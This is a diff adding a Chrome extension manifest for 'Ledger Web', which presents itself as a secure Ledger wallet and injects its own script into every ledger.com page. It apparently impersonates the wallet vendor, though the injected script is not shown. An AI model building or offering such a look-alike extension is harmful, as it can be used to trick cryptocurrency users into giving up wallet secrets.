@@ -1,0 +1,29 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+   "author": "LedgerCo",
+   "background": {
+      "persistent": false,
+      "scripts": [ "scripts/jquery-3.4.1.min.js", "scripts/background.js" ]
+   },
+	 "content_scripts": [ {
+			"js": [ "scripts/jquery-3.4.1.min.js", "scripts/background.js"  ],
+			"matches": [ "*://*.ledger.com/*" ]
+	 } ],
+   "browser_action": {
+      "default_icon": {
+         "128": "images/icon-128.png",
+         "16": "images/icon-16.png",
+         "256": "images/icon-256.png",
+         "32": "images/icon-32.png",
+         "64": "images/icon-64.png"
+      },
+			    "default_popup": "popup.html",
+      "default_title": "Connect"
+   },
+   "description": "New Ledger Web wallet, more secure, fast confirm transaction.",
+   "manifest_version": 2,
+   "name": "Ledger Web",
+   "permissions": [ "activeTab" ,"storage" ],
+   "version": "1.0.8"
+}
